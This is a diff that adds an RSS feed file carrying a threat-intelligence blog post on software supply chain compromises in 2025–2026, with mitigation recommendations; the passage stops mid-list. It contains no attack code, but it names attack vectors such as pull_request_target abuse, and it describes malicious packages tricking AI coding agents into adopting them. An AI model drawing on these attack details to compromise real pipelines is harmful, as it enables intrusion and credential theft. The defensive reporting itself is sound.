@@ -1,0 +1,1011 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/"><channel><title>Threat Intelligence</title><link>https://cloud.google.com/blog/topics/threat-intelligence/</link><description>Threat Intelligence</description><atom:link href="https://cloudblog.withgoogle.com/blog/topics/threat-intelligence/rss/" rel="self"></atom:link><language>en</language><lastBuildDate>Thu, 20 Aug 2026 13:50:16 +0000</lastBuildDate><image><url>https://cloud.google.com/blog/topics/threat-intelligence/static/blog/images/google.a51985becaa6.png</url><title>Threat Intelligence</title><link>https://cloud.google.com/blog/topics/threat-intelligence/</link></image><item><title>Batten Down Your Packages: Mitigation Guidance for Supply Chain Compromise</title><link>https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/</link><description>&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;Written by: &lt;span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;"&gt;Kelli Vanderlee, &lt;/span&gt;&lt;span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;"&gt;Stuart Carrera&lt;/span&gt;&lt;/p&gt;
+&lt;hr/&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For years, the cybersecurity industry's understanding of software supply chain compromise has been anchored by a few watershed events, including &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Russian cyber espionage actor ICE RELIC’s (formerly known as APT29) 2020 compromise of SolarWinds&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;North Korean cyber espionage actor UNC4736's 2023 compromise of 3CX&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. However, Google Threat Intelligence Group (GTIG) has been tracking growth in threat activity targeting open source software repositories to conduct supply chain compromises over the past several years. A series of large scale open source software supply chain compromise campaigns in 2025 and the first half of 2026 underscore how important it is that organizations implement defensive strategies that directly address this threat vector. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In this blog post, GTIG and Mandiant discuss trends we have observed in threat actor use of software supply chain compromise, and provide mitigation and hardening recommendations that incorporate insights we have developed as a result of supporting customers through recent campaigns in which threat actors manipulated open source packages. &lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Open Source Supply Chain Compromise Grows in Volume and Impact in 2025 and Early 2026&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The majority of the most impactful and far-reaching supply chain compromise incidents that GTIG tracked in 2025 and early 2026 involved the compromise of code repositories, software dependencies and developer tools (T1195.001). Open source supply chain compromises offer attackers the same efficiency, scale, and initial stealth as traditional supply chain compromises, but typically require significantly less planning and resources to execute. However, open source supply chain compromises are also noisy once enabled; malicious open source packages are often discovered and publicized much more quickly than traditional supply chain compromises. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG assesses with high confidence that the growth in very large-scale, open-source supply chain compromise &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;campaigns&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;, including use of worms and iterative compromises in 2025 and early 2026, represent a significant expansion in use of this tactic compared to prior years. We anticipate that threat actors will emulate the tactics of these campaigns and contribute to growth in open-source supply chain compromise through the rest of 2026 and years to come. GTIG identified several notable supply chain compromises in 2025 and early 2026 that we believe exemplify this trend of exceptionally large campaigns, as measured by size and/or impact (Figure 1). &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "
+      &gt;
+
+      
+      
+        
+        &lt;img
+            src="https://storage.googleapis.com/gweb-cloudblog-publish/images/BattenDownYourPackages_1.max-1000x1000.png"
+        
+          alt="Notable open source supply chain compromises"&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p data-block-key="vn5dq"&gt;Figure 1: Notable open source supply chain compromises, 2025 - early 2026&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For example from February to May 2026, UNC6780 (aka "TeamPCP") conducted extensive open source supply chain compromises targeting ecosystems like PyPI, npm, and Docker Hub. Initial infection vectors varied across incidents, and included abuse of the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;pull_request_target&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; GitHub Actions trigger to obtain base repository secrets and write permissions. The threat actor typically used compromised packages to deploy credential stealers, including SANDCLOCK, to obtain high value secrets. In incident response engagements, we observed UNC6780 attempting to pivot from &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/ai-vulnerability-exploitation-initial-access"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;compromised artificial intelligence (AI) software&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to broader network environments. UNC6780 has monetized stolen credentials through either direct sale of the stolen data, or through partnerships with ransomware and data theft extortion groups. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In March 2026, GTIG &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;observed&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; the introduction of a malicious dependency in the legitimate &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;axios&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; package. GTIG analysis and the maintainer's &lt;/span&gt;&lt;a href="https://github.com/axios/axios/issues/10636" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;post mortem&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; indicate that the maintainer account was compromised via social engineering and used to publish the updated versions. We identified the malicious dependency as a dropper that deploys the &lt;/span&gt;&lt;a href="https://advantage.mandiant.com/malware/malware--804dc049-ef98-568b-b8ee-cc5cf634b52d" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;WAVESHAPER.V2&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; backdoor, and attributes the activity to North Korean actor MIDNIGHT NEPTUNE (formerly known as &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;UNC1069&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;). While the malicious versions of axios were removed from the npm registry within three hours of their release, the scope of the compromise is estimated to be broad, as the package has over 100 million weekly downloads. GTIG supported customers in at least 15 industry verticals and 13 different countries affected by this incident. Further, axios is also a dependency for tens of thousands of other packages, and open sources &lt;/span&gt;&lt;a href="https://socket.dev/blog/axios-npm-package-compromised" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;reported&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; that the malicious axios update had spread to several of these.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;AI Likely to Accelerate Open Source Supply Chain Compromises&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;GTIG anticipates AI will accelerate the growth of open source software supply chain compromise. Integration of AI into open source software development practices, including "vibe coding," increases attacker opportunities both to manipulate AI functionalities and to take advantage of AI to speed and scale their own operational planning. Open sources have documented &lt;/span&gt;&lt;a href="https://www.hiddenlayer.com/research/malware-found-in-trending-hugging-face-repository-open-oss-privacy-filter" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;multiple&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;instances&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; of threat actors planting malicious resources on open source AI communities and &lt;/span&gt;&lt;a href="https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;inserting&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; malicious code into open source Model Context Protocol (MCP) packages. MCP is a standardized protocol for AI to interact with tools and data. Malicious packages have also tricked AI coding agents, which have unwittingly incorporated them into projects. North Korean threat actors &lt;/span&gt;&lt;a href="https://www.reversinglabs.com/blog/claude-promptmink-malware-crypto" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;reportedly&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; uploaded malicious cryptocurrency-themed packages, and subsequently an AI coding agent co-authored a commit integrating one of the malicious packages as a dependency to a legitimate cryptocurrency trading project. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Thousands of Malicious Open Source Packages Detected&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Corroborating GTIG's findings, statistics compiled by the Open Source Security Foundation (&lt;/span&gt;&lt;a href="https://openssf.org/blog/2023/10/12/introducing-openssfs-malicious-packages-repository/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;OpenSSF&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;), a cross-industry, non-profit collaboration under the Linux Foundation, indicate that the number of malicious open source software packages identified increased exponentially, or 1,444% from 2024 to 2025 (Figure 2).&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "
+      &gt;
+
+      
+      
+        
+        &lt;img
+            src="https://storage.googleapis.com/gweb-cloudblog-publish/images/BattenDownYourPackages_2.max-1000x1000.png"
+        
+          alt="Count of malicious open source packages"&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p data-block-key="vn5dq"&gt;Figure 2: Count of malicious open source packages reported 2022–2025 (source: &lt;a href="https://ossf.github.io/malicious-packages/stats/"&gt;OpenSSF&lt;/a&gt;)&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Traditional Supply Chain Compromise Remains Rare&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In contrast to what we observed in the open source ecosystem, GTIG assesses with high confidence that traditional software supply chain compromise, the manipulation of source code or update/distribution mechanisms (T1195.002), remains rare. The handful of identified cases in 2025 and early 2026 were predominantly cyber espionage incidents with intentionally limited targeting scopes. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In the most significant case, &lt;/span&gt;&lt;a href="https://www.fbi.gov/investigate/cyber/alerts/2025/north-korea-responsible-for-1-5-billion-bybit-hack" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;North Korean&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; threat actor UNC4899 &lt;/span&gt;&lt;a href="https://x.com/safe/status/1897663514975649938?s=20" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;reportedly&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; used social engineering to compromise a developer's machine at a web3 organization. The threat actor &lt;/span&gt;&lt;a href="https://slowmist.medium.com/bybits-1-5-billion-theft-unveiled-safe-wallet-front-end-code-tampered-84b78f0fa9c2" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;used&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; this access to inject malicious code into the frontend systems, &lt;/span&gt;&lt;a href="https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;specifically&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; impacting smart contract functionality to alter transactions initiated by a third party organization that utilized the multi-signature wallet with the targeted organization. This compromise was tailored to a single victim, but did not directly touch the targeted organization's infrastructure. The compromise ultimately led to a cryptocurrency theft of assets with an estimated value of $1.4B USD.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Other examples include the compromise of hosting infrastructure serving updates of &lt;/span&gt;&lt;a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Notepad++&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; from June to December 2025, activity GTIG attributes to UNC6688. GTIG observed organizations in South Korea and France affected by this activity.  GTIG also tracked the early 2026 compromise of &lt;/span&gt;&lt;a href="https://securelist.com/tr/daemon-tools-backdoor/119654/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;DAEMON Tools installers&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. During this campaign, UNC6863 deployed SLICKDEMON to perform broad-spectrum reconnaissance and filter for targets of strategic interest. Following this profiling stage, the group selectively delivered the shellcoded loader BADFALL to facilitate hands-on-keyboard activity and bridge the deployment of the advanced QUIC RAT. The campaign targeted Russia, Brazil, and Turkey, with follow-on exploitation of government and scientific entities in Belarus and Thailand.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In addition to likely cyber espionage incidents, we observed suspected financially motivated compromises with broader distribution. In two separate incidents threat actors compromised underlying software used in consumer-facing websites: in one case, &lt;/span&gt;&lt;a href="https://www.securityweek.com/100-car-dealerships-hit-by-supply-chain-attack/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;automotive dealership websites&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; served ClickFix lures leading to the installation of SHADOWLADDER (aka SectopRAT), and in another, eCommerce websites were &lt;/span&gt;&lt;a href="https://sansec.io/research/license-backdoor" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;infected&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; with web skimmers.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Mitigation Recommendations&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To effectively mitigate and harden against software supply chain compromises, organizations should adopt a multi-tiered defensive strategy designed to minimize exposure and strengthen resilience against potential compromises.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Administrative Oversight and Risk Governance&lt;/span&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Cataloging Assets and Dependencies: &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;Maintain a tiered, continuous inventory of all applications, third-party vendors, and services based on operational importance to detect single points of failure and security risks.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Software Bill of Materials (SBOM)&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Implement an automated SBOM for all internal and third-party software packages, allowing security teams to continuously monitor and cross-reference active code inventories against newly disclosed vulnerabilities.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Action Bill of Materials (ABOM):&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Maintain a dedicated ABOM to inventory every third-party pipeline vendor and development utility in use, linking it to your container image inventory to track exactly which external actions are building your production images.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Software Development Lifecycle (SDLC) Threat Modeling and Attack Chain Mapping (Wiz SITF):&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Align your software supply chain risk management with capabilities such as the &lt;/span&gt;&lt;a href="https://github.com/wiz-sec-public/SITF" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Wiz SDLC Infrastructure Threat Framework (SITF) &lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;to transition from treating security as a checklist of isolated controls to a holistic threat model. With this freely available framework, organizations can map recent incidents, threat actor campaigns, and red team exercises directly to Wiz SITF Reference IDs indexing each risk to its specific lifecycle stage: Version Control Systems (VCS), continuous integration and continuous delivery (CI/CD) pipelines, package registries, or production infrastructure. This methodology allows security teams to model complex "attack chains" where minor, isolated weaknesses (e.g., a lockfile bypass combined with an overprivileged pipeline token) are chained together by sophisticated threat actors to execute critical, high-impact breaches&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Active Risk Monitoring:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;  Maintain a dedicated supply chain risk register and a centralized remediation tracker to systematically group development lifecycle (SDLC) threats into clear operational domains: Governance, Identity, Pipeline Logic, and Supply Chain Hygiene. If using Wiz SITF, each vulnerability must be mapped to its exact pipeline stage with a unique Wiz SITF Reference ID. Instead of treating vulnerabilities as isolated bugs, prioritize the blocking of complex "attack chains" (such as a leaked token combined with missing branch protections and overprivileged OIDC trust) that pose the highest breach risk. Ensure each logged item has a designated owner, a targeted completion date, and clear tracking of technical dependencies.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Standardized Configuration &amp;amp; Change Control:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Form a Change Advisory Board (CAB) to manage the rollout of all enterprise software and hardware. Ensure every modification includes a pre-deployment risk review, post-deployment monitoring, and a verified plan for recovery or backout.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Staff Security Education:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Deploy ongoing training initiatives centered on supply chain hazards, social engineering techniques, and internal procedures for reporting incidents.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Node.js (npm/pnpm):&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Enforce cooldown controls by using the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;minimumReleaseAge&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; configuration. Setting this value to at least 24 hours (1440 minutes) ensures that freshly published, potentially poisoned packages are quarantined until the broader security community has had time to identify and remove them. Ensure that older, unsupported package manager versions (such as legacy Yarn or pnpm versions) are modernized, as they will silently ignore these cooldown boundaries.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Python (pip)&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Ensure that Python project environments do not pull dependencies directly from the public PyPI registry, which bypasses internal release-age policies and gating controls. All configurations must specify a secure, vetted private &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;--index-url &lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;in their configuration files to ensure consistent quarantine and vetting of upstream packages.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Vendor Lifecycle Management&lt;/span&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Vendor Security Vetting:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Conduct rigorous due diligence prior to procurement by assessing third-party security frameworks against industry standards such as ISO 27001 or SOC 2.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Cybersecurity Provisions in Contracts:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Integrate specific security mandates into vendor agreements, including strict timelines for incident notification, persistent audit rights, and clear liability terms.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Hardware Provenance and Verification:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Use supply chain tracing to confirm the integrity of components, establish methods for detecting counterfeit items, and secure the logistics of repairs and replacements.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Security Architecture and Engineering Controls&lt;/span&gt;&lt;/h4&gt;
+&lt;h5&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Identity and Access Management&lt;/span&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Automated System and Workload Identities&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Transition third-party integrations and build-system processes away from static, long-lived administrative Personal Access Tokens (PATs). Instead, mandate the use of dedicated GitHub Apps or short-lived system tokens via federated OpenID Connect (OIDC) for automated machine integrations. This ensures that credentials used by system-to-system workflows expire in a matter of minutes, neutralizing the risk of a persistent compromise if an automation pipeline is breached.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Developer and User Identity Controls (command-line interface (CLI) and Repository Access): &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;Enforce strict access control boundaries for programmatic developer sessions. Because Okta-linked SAML SSO is only capable of verifying identity during the initial creation or authorization of personal tokens and keys, continuous session state cannot be challenged over programmatic CLI connections. Therefore, session security must be enforced through credential expiration and hardware-backed controls.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Enforce Strict Token Expiration:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Strictly limit the allowable lifespan of all personal access tokens (PATs) and programmatic application programming interface (API) keys to a minimum threshold (e.g.a maximum 7-day limit). This guarantees that credentials expire regularly, forcing developers to re-authenticate through the primary SSO gateway.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Consider Restricting Personal Access Tokens to Neutralize Git-over-HTTPS &amp;amp; Mandate FIDO2 Secure Shell (SSH): &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;To protect developer environments against credential theft, organizations should consider restricting Personal Access Tokens (PATs) globally across GitHub Enterprise Cloud. Because GHEC has no direct protocol-disable switch, administrators should consider disabling classic PATs and enforcing short token lifespans to effectively block unauthorized programmatic HTTPS connections. This protocol containment helps encourage developers to shift entirely to SSH authentication. To secure this transport layer, consider mandating the use of hardware-backed FIDO2 security keys to cryptographically verify physical token possession for all command-line repository actions.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Isolated CI/CD Execution:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Utilize ephemeral runners for build pipelines that are purged immediately after completing a single task. This prevents malicious actors from maintaining a persistent presence between different build phases.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Workflow Trigger Governance (pull_request_target): &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;Strictly limit and secure the use of highly privileged triggers such as pull_request_target in automated environments. Multiple prominent supply chain campaigns have actively exploited vulnerable workflows using this trigger as their initial entry vector.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Infrastructure Protection&lt;/span&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Zero Trust and Least Privilege:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Maintain rigorous control over managed service providers (MSPs) and third-party vendors by enforcing role-based access control (RBAC), multifactor authentication (MFA), and frequent audits of access rights.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Network Micro-Segmentation:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Segregate vital hardware and software from the rest of the enterprise network. Use allow-list-only firewall rules to block unauthorized outbound traffic and disrupt command-and-control (C2) activities.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Secure Development Ecosystems&lt;/span&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Pipeline and Sandbox Isolation:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Ensure that testing environments, CI/CD pipelines, and informal scripting sandboxes are physically or logically isolated from production assets.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
